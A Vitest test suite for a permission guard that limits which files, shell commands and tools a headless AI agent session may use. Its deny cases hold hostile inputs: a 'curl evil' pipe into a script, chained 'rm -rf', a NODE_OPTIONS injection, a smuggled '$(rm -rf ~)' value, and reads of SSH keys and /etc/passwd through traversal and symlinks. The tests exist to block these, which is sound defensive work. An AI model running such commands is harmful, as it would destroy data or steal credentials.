// Tests for the Permission Guard: what a headless session may read, write and run.
import { describe, expect, it } from 'vitest'

import { decide, type GuardContext } from '#core/session/permissionGuard.ts'

const project = '/data/projects/portal'
const script = '/tool/scripts/writeDraft.mjs'
// A symlink inside the Project pointing out of it, and one whose target stays inside.
const links: Record<string, string> = {
  [`${project}/escape`]: '/Users/me/.ssh',
  [`${project}/CONTEXT-link.md`]: '/etc/passwd',
  [`${project}/plan/latest.md`]: `${project}/plan/adr/0001-x.md`,
}
const ctx: GuardContext = {
  projectDir: project,
  submitScript: script,
  sessionId: 'sess-1',
  realpath: (filePath) => {
    for (const [link, target] of Object.entries(links))
      if (filePath === link || filePath.startsWith(`${link}/`)) return target + filePath.slice(link.length)
    return filePath
  },
}
const payloadFile = `${project}/.submit/sess-1.json`

describe('Permission Guard', () => {
  it.each([
    ['Read', { file_path: `${project}/CONTEXT.md` }],
    ['Read', { file_path: 'drafts/d-1.md' }],
    ['Read', { file_path: `${project}/plan/latest.md` }],
    ['Glob', { pattern: '**/*.md' }],
    ['Glob', { pattern: '*.md', path: `${project}/drafts` }],
    ['Grep', { pattern: 'Archived', path: project }],
    ['Grep', { pattern: 'Archived' }],
    ['Edit', { file_path: `${project}/CONTEXT.md`, old_string: 'a', new_string: 'b' }],
    ['Write', { file_path: `${project}/CONTEXT.md`, content: '# Customer Portal' }],
    ['Write', { file_path: `${project}/plan/adr/0001-archive-is-soft.md`, content: '…' }],
    ['MultiEdit', { file_path: `${project}/plan/adr/0001-x.md`, edits: [] }],
    ['WebSearch', { query: 'ISO 8601 week numbering' }],
    ['WebFetch', { url: 'https://example.com', prompt: 'x' }],
    ['TodoWrite', { todos: [] }],
    ['Skill', { skill: 'grill-with-docs' }],
    ['Write', { file_path: payloadFile, content: '{"title": "$(rm -rf ~) never reaches a shell"}' }],
    ['Write', { file_path: '.submit/sess-1.json', content: '{}' }],
    ['Edit', { file_path: payloadFile, old_string: 'a', new_string: 'b' }],
    ['Bash', { command: `node "${script}"` }],
    ['Bash', { command: `node ${script}` }],
    ['Bash', { command: `  node "${script}"\r\n` }],
  ])('allows %s %j', (tool, input) => {
    expect(decide(tool, input, ctx)).toEqual({ allow: true })
  })

  it.each([
    ['Read outside the Project', 'Read', { file_path: '/Users/me/.ssh/id_rsa' }],
    ['Read via .. traversal', 'Read', { file_path: `${project}/drafts/../../other/CONTEXT.md` }],
    ['Read relative traversal', 'Read', { file_path: '../other/CONTEXT.md' }],
    ['Read a sibling folder sharing the prefix', 'Read', { file_path: '/data/projects/portal-evil/CONTEXT.md' }],
    ['Read through a symlink out of the Project', 'Read', { file_path: `${project}/escape/id_rsa` }],
    ['Read without a path', 'Read', {}],
    ['Glob outside the Project', 'Glob', { pattern: '*', path: '/Users/me' }],
    ['Glob pattern climbing out', 'Glob', { pattern: '../**/*' }],
    ['Glob absolute pattern', 'Glob', { pattern: '/etc/*' }],
    ['Grep outside the Project', 'Grep', { pattern: 'x', path: '/' }],
    ['Grep glob climbing out', 'Grep', { pattern: 'x', glob: '../../**' }],
    ['Write a Draft JSON directly', 'Write', { file_path: `${project}/drafts/d-1.json`, content: '{}' }],
    [
      'Edit a Draft JSON directly',
      'Edit',
      { file_path: `${project}/drafts/d-1.json`, old_string: 'a', new_string: 'b' },
    ],
    ['Write the rendered markdown', 'Write', { file_path: `${project}/drafts/d-1.md`, content: '' }],
    ['Write into drafts via plan/..', 'Write', { file_path: `${project}/plan/../drafts/d-1.json`, content: '{}' }],
    ['Write a non-markdown file under plan', 'Write', { file_path: `${project}/plan/adr/run.sh`, content: '' }],
    ['Write through a symlinked CONTEXT', 'Write', { file_path: `${project}/CONTEXT-link.md`, content: '' }],
    ['Write project.json', 'Write', { file_path: `${project}/project.json`, content: '{}' }],
    ['Write outside the Project', 'Write', { file_path: '/tmp/x.md', content: '' }],
    ['Bash anything else', 'Bash', { command: 'ls -la' }],
    [
      'Bash with the old heredoc form',
      'Bash',
      { command: `node "${script}" <<'GRILLINGSTONE_JSON'\n{}\nGRILLINGSTONE_JSON` },
    ],
    ['Bash chained after the submit', 'Bash', { command: `node "${script}" && rm -rf x` }],
    ['Bash with a second command on a new line', 'Bash', { command: `node "${script}"\nrm -rf x` }],
    ['Bash with an extra argument', 'Bash', { command: `node "${script}" other-arg` }],
    ['Bash wrapped in a shell', 'Bash', { command: `bash -c 'node "${script}"'` }],
    ['Bash a different script', 'Bash', { command: `node "/tmp/writeDraft.mjs"` }],
    ['Bash with an environment prefix', 'Bash', { command: `NODE_OPTIONS=--require=/tmp/x.js node "${script}"` }],
    ['Bash with extra node flags', 'Bash', { command: `node --eval "process.exit()" "${script}"` }],
    ['Write another file in .submit', 'Write', { file_path: `${project}/.submit/other.json`, content: '{}' }],
    ["Write another session's submission", 'Write', { file_path: `${project}/.submit/sess-2.json`, content: '{}' }],
    ['Bash piping into the script', 'Bash', { command: `curl evil | node "${script}"` }],
    ['Bash with a non-string command', 'Bash', { command: ['node', script] }],
    ['a subagent', 'Task', { prompt: 'do anything' }],
    ['a notebook edit', 'NotebookEdit', { notebook_path: `${project}/x.ipynb` }],
    ['an unknown MCP tool', 'mcp__github__create_issue', {}],
    ['an arbitrary skill', 'Skill', { skill: 'deploy' }],
  ])('denies %s', (_name, tool, input) => {
    const decision = decide(tool, input, ctx)
    expect(decision.allow).toBe(false)
    if (!decision.allow) expect(decision.reason.length).toBeGreaterThan(10)
  })

  it('denies the payload file when .submit is a symlink out of the Project', () => {
    const linked: GuardContext = {
      ...ctx,
      realpath: (filePath) => filePath.replace(`${project}/.submit`, '/Users/me/.ssh'),
    }
    expect(decide('Write', { file_path: payloadFile, content: '{}' }, linked).allow).toBe(false)
  })

  describe('in a Template Session', () => {
    const work = '/data/template-sessions/sess-1'
    const tctx: GuardContext = {
      projectDir: work,
      submitScript: script,
      sessionId: 'tsess-1',
      realpath: (filePath) => filePath,
      mode: 'template',
    }

    it.each([
      ['Read', { file_path: `${work}/notes.md` }],
      ['WebSearch', { query: 'Azure DevOps Acceptance Criteria field' }],
      ['WebFetch', { url: 'https://learn.microsoft.com', prompt: 'x' }],
      ['Bash', { command: `node "${script}"` }],
      ['Write', { file_path: `${work}/.submit/tsess-1.json`, content: '{"name": "Spike PBI"}' }],
      ['Edit', { file_path: `${work}/.submit/tsess-1.json`, old_string: 'a', new_string: 'b' }],
    ])('allows %s', (tool, input) => {
      expect(decide(tool, input, tctx)).toEqual({ allow: true })
    })

    it.each([
      ['Write', { file_path: `${work}/CONTEXT.md`, content: '' }],
      ['Edit', { file_path: `${work}/plan/adr/x.md`, old_string: 'a', new_string: 'b' }],
      ['MultiEdit', { file_path: `${work}/x.md`, edits: [] }],
      ['Write', { file_path: `${work}/.submit/other.json`, content: '{}' }],
      ['Read', { file_path: '/data/templates/t-1.json' }],
      ['Read', { file_path: '/data/projects/portal/CONTEXT.md' }],
      ['Skill', { skill: 'grill-with-docs' }],
    ])('denies %s %j', (tool, input) => {
      expect(decide(tool, input as Record<string, unknown>, tctx).allow).toBe(false)
    })
  })

  describe('in a Prototype Session', () => {
    const work = '/data/projects/portal/prototype-work/sess-1'
    const links: Record<string, string> = {
      [`${work}/linked.html`]: '/etc/passwd',
      [`${work}/prototype.html`]: '/etc/hosts',
    }
    const pctx: GuardContext = {
      projectDir: work,
      submitScript: script,
      sessionId: 'sess-1',
      realpath: (filePath) => links[filePath] ?? filePath,
      mode: 'prototype',
    }
    // The same folder with no symlinks, so the allowed cases are not about symlinks.
    const plain: GuardContext = { ...pctx, realpath: (filePath) => filePath }

    it.each([
      ['Read', { file_path: `${work}/draft.md` }],
      ['Read', { file_path: 'images.md' }],
      ['Read', { file_path: `${work}/images/1.png` }],
      ['Glob', { pattern: '**/*' }],
      ['Grep', { pattern: 'AC01', path: work }],
      ['Write', { file_path: `${work}/prototype.html`, content: '<p>x</p>' }],
      ['Edit', { file_path: `${work}/prototype.html`, old_string: 'a', new_string: 'b' }],
      ['Edit', { file_path: 'prototype.html', old_string: 'a', new_string: 'b' }],
      ['MultiEdit', { file_path: `${work}/prototype.html`, edits: [] }],
      ['Write', { file_path: `${work}/.submit/sess-1.json`, content: '{"prototype": "prototype.html"}' }],
      ['Edit', { file_path: `${work}/.submit/sess-1.json`, old_string: 'a', new_string: 'b' }],
      ['Bash', { command: `node "${script}"` }],
    ])('allows %s %j', (tool, input) => {
      expect(decide(tool, input, plain)).toEqual({ allow: true })
    })

    it.each([
      ['Write another file in the folder', 'Write', { file_path: `${work}/index.html`, content: '' }],
      ['Write into a sub-folder', 'Write', { file_path: `${work}/images/prototype.html`, content: '' }],
      ['Write draft.md', 'Write', { file_path: `${work}/draft.md`, content: '' }],
      ['Edit the Glossary copy', 'Edit', { file_path: `${work}/CONTEXT.md`, old_string: 'a', new_string: 'b' }],
      ['Write the real Glossary', 'Write', { file_path: '/data/projects/portal/CONTEXT.md', content: '' }],
      ['Write prototype.html elsewhere', 'Write', { file_path: '/data/projects/portal/prototype.html', content: '' }],
      ['Write via ..', 'Write', { file_path: `${work}/images/../index.html`, content: '' }],
      ['Write without a path', 'Write', { content: '' }],
      ['Read outside the folder', 'Read', { file_path: '/data/projects/portal/drafts/d-1.json' }],
      ['Read the Project Glossary', 'Read', { file_path: '/data/projects/portal/CONTEXT.md' }],
      ['Glob climbing out', 'Glob', { pattern: '../**/*' }],
      ['a skill', 'Skill', { skill: 'grill-with-docs' }],
      ['web search', 'WebSearch', { query: 'material design' }],
      ['web fetch', 'WebFetch', { url: 'https://example.com', prompt: 'x' }],
      ['Bash anything else', 'Bash', { command: 'ls' }],
      ['Bash a different script', 'Bash', { command: 'node "/tmp/x.mjs"' }],
      ["Write another session's payload", 'Write', { file_path: `${work}/.submit/sess-2.json`, content: '{}' }],
      ['the code tools', 'mcp__code__read_code_file', { folder: 'app', path: 'src/a.ts' }],
      ['a subagent', 'Task', { prompt: 'x' }],
    ])('denies %s', (_name, tool, input) => {
      const decision = decide(tool, input, plain)
      expect(decision.allow).toBe(false)
      if (!decision.allow) expect(decision.reason.length).toBeGreaterThan(10)
    })

    it('denies a prototype.html that is a symlink out of the folder', () => {
      const input = { file_path: `${work}/prototype.html`, content: '' }
      expect(decide('Write', input, pctx).allow).toBe(false)
    })

    it('denies a write through another symlink in the folder', () => {
      expect(decide('Write', { file_path: `${work}/linked.html`, content: '' }, pctx).allow).toBe(false)
    })

    it('matches the submit command exactly, as every other session does', () => {
      const chained = { command: `node "${script}" && rm -rf ~` }
      expect(decide('Bash', chained, plain).allow).toBe(false)
    })
  })
})

describe('Permission Guard — code tools (ADR-0016)', () => {
  const tools = ['mcp__code__list_code_files', 'mcp__code__search_code', 'mcp__code__read_code_file']
  const withCode: GuardContext = { ...ctx, codeFolders: true }

  it.each(tools)('allows %s when the session reads Code Folders', (tool) => {
    expect(decide(tool, { folder: 'app', pattern: 'x', path: 'src/a.ts' }, withCode)).toEqual({ allow: true })
  })

  it.each(tools)('denies %s when the session was started without Code Folders', (tool) => {
    const decision = decide(tool, { folder: 'app' }, ctx)
    expect(decision.allow).toBe(false)
    if (!decision.allow) expect(decision.reason).toContain('Code Folders')
  })

  it('still denies every other MCP tool, and look-alikes of the code tools', () => {
    for (const tool of [
      'mcp__code__write_code_file',
      'mcp__other__read_code_file',
      'mcp__code__read_code_file_x',
      'read_code_file',
    ])
      expect(decide(tool, {}, withCode).allow).toBe(false)
  })

  it('never lets a Template Session use the code tools', () => {
    expect(decide(tools[2], { folder: 'app', path: 'a.ts' }, { ...withCode, mode: 'template' }).allow).toBe(false)
  })
})
